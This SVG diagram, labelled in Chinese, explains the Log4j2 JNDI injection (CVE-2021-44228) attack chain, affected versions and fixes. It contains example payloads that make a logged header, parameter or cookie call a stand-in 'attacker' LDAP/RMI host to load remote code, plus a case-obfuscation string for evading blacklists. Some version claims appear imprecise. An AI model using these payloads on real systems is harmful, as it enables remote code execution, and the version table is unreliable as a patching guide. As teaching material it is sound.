<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 560" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <defs>
    <marker id="arr-l4" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#c0392b"/>
    </marker>
  </defs>
  <rect x="0" y="0" width="1200" height="560" fill="#f8fafc" rx="10"/>
  <text x="40" y="42" font-size="22" font-weight="bold" fill="#111">Log4j2（CVE-2021-44228）攻击链路</text>
  <text x="40" y="64" font-size="14" fill="#666">JNDI 注入 → LDAP/RMI → 远程加载恶意类 → 任意代码执行</text>

  <rect x="30" y="160" width="200" height="90" rx="12" fill="#fee2e2" stroke="#c0392b" stroke-width="2.5"/>
  <text x="130" y="190" font-size="16" text-anchor="middle" fill="#111" font-weight="bold">🕵️ 攻击者</text>
  <text x="130" y="215" font-size="13" text-anchor="middle" fill="#555">构造 JNDI payload</text>

  <path d="M 230 205 L 270 205" stroke="#c0392b" stroke-width="2.5" fill="none" marker-end="url(#arr-l4)"/>

  <rect x="280" y="120" width="280" height="180" rx="12" fill="#dbeafe" stroke="#2980b9" stroke-width="2.5"/>
  <text x="420" y="150" font-size="16" text-anchor="middle" fill="#111" font-weight="bold">💉 JNDI 注入 Payload</text>
  <line x1="300" y1="160" x2="540" y2="160" stroke="#2980b9" stroke-width="1"/>
  <text x="300" y="190" font-size="12" fill="#333">方式1（Header 注入）：</text>
  <text x="300" y="210" font-size="11" fill="#555">User-Agent: ${jndi:ldap://attacker:1389/exp}</text>
  <text x="300" y="230" font-size="12" fill="#333">方式2（参数注入）：</text>
  <text x="300" y="250" font-size="11" fill="#555">id=${jndi:rmi://attacker:1099/exp}</text>
  <text x="300" y="270" font-size="12" fill="#333">方式3（Cookie 注入）：</text>
  <text x="300" y="290" font-size="11" fill="#555">Cookie: session=${jndi:ldap://attacker:1389/exp}</text>

  <path d="M 560 205 L 600 205" stroke="#2980b9" stroke-width="2.5" fill="none" marker-end="url(#arr-l4)"/>

  <rect x="610" y="160" width="200" height="90" rx="12" fill="#e8f5e9" stroke="#27ae60" stroke-width="2"/>
  <text x="710" y="190" font-size="16" text-anchor="middle" fill="#111" font-weight="bold">🖥️ Java 应用</text>
  <text x="710" y="215" font-size="13" text-anchor="middle" fill="#555">Log4j 解析 ${jndi:...}</text>

  <path d="M 810 205 L 850 205" stroke="#27ae60" stroke-width="2.5" fill="none" marker-end="url(#arr-l4)"/>

  <rect x="860" y="160" width="200" height="90" rx="12" fill="#fef9c3" stroke="#b45309" stroke-width="2"/>
  <text x="960" y="190" font-size="16" text-anchor="middle" fill="#111" font-weight="bold">🏛️ LDAP/RMI 服务端</text>
  <text x="960" y="215" font-size="13" text-anchor="middle" fill="#555">攻击者控制（marshalsec）</text>

  <path d="M 1060 205 C 1100 350, 350 380, 270 205" stroke="#b45309" stroke-width="2" stroke-dasharray="5,3" fill="none" marker-end="url(#arr-l4)"/>
  <text x="660" y="390" font-size="13" fill="#b45309" text-anchor="middle" font-weight="bold">JNDI 回调 → 加载恶意 Java Class → 执行命令 → RCE</text>

  <rect x="30" y="340" width="1130" height="200" rx="10" fill="#ffffff" stroke="#ddd" stroke-width="1"/>
  <text x="50" y="370" font-size="16" font-weight="bold" fill="#111">版本影响</text>

  <text x="50" y="400" font-size="14" font-weight="bold" fill="#c0392b">Log4j 2.x &lt; 2.15.0</text>
  <text x="280" y="400" font-size="13" fill="#333">完整受影响，所有 JNDI 协议均可利用（LDAP/RMI/HTTP/DNS）</text>

  <text x="50" y="430" font-size="14" font-weight="bold" fill="#2980b9">Log4j 2.15.0 ~ 2.17.0</text>
  <text x="280" y="430" font-size="13" fill="#333">LDAP/RMI 被禁用，但 HTTP/DNS 仍可绕过</text>

  <text x="50" y="460" font-size="14" font-weight="bold" fill="#27ae60">Log4j ≥ 2.17.1</text>
  <text x="280" y="460" font-size="13" fill="#333">完全修复，所有 JNDI Lookup 被禁用</text>

  <text x="50" y="490" font-size="14" font-weight="bold" fill="#111">绕过方式（针对修复版本）</text>
  <text x="280" y="490" font-size="13" fill="#333">${jndi:${lower:l}${lower:d}ap://...} 大小写混淆绕过黑名单</text>

  <text x="50" y="520" font-size="14" font-weight="bold" fill="#b45309">修复</text>
  <text x="180" y="520" font-size="13" fill="#333">升级 Log4j ≥ 2.17.1 / 临时缓解：-Dlog4j2.formatMsgNoLookups=true / 删除 JndiLookup.class</text>
</svg>
